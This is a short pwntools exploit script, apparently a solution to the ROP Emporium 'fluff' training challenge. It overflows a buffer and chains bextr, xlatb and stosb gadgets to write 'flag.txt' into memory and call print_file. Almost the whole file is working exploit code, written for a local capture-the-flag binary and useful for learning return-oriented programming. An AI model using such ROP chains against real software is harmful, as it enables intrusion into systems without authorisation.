from pwn import *

elf = ELF('fluff')                 #context.binary

junk = b"A"*40   

writeable_address = 0x0000000000601028

pop_rdx_rcx_add_rcx_bextr_ret_gadget = 0x000000000040062a

xlatb_ret = 0x0000000000400628

pop_rdi_ret = 0x00000000004006a3

stosb = 0x0000000000400639

const_to_subtract = 0x3ef2

print_file = 0x00400510

flag_string = b"flag.txt"
char_locations = []

for char in flag_string:
      char_address = hex(read('fluff').find(char) + elf.address)
      char_locations.append(char_address)

current_rax = 0xb

p = process(elf.path)

junk = b"A"*40

prepare_string = b""

for i, char_locations in enumerate(char_locations):
      if(i != 0):
            current_rax = flag_string[i-1]

      prepare_string += p64(pop_rdx_rcx_add_rcx_bextr_ret_gadget)
      prepare_string += p64(0x4000)
      prepare_string += p64(int(char_locations, 16) - current_rax - 0x3ef2)
      prepare_string += p64(xlatb_ret)
      prepare_string += p64(pop_rdi_ret)
      prepare_string += p64(writeable_address + i)
      prepare_string += p64(stosb)

payload = junk + prepare_string + p64(pop_rdi_ret) + p64(writeable_address) + p64(print_file)
# Send the payload

p.sendline(payload)                 #send the payload to the process

p.interactive()

# The flag is:
# ROPE{a_placeholder_32byte_flag!}

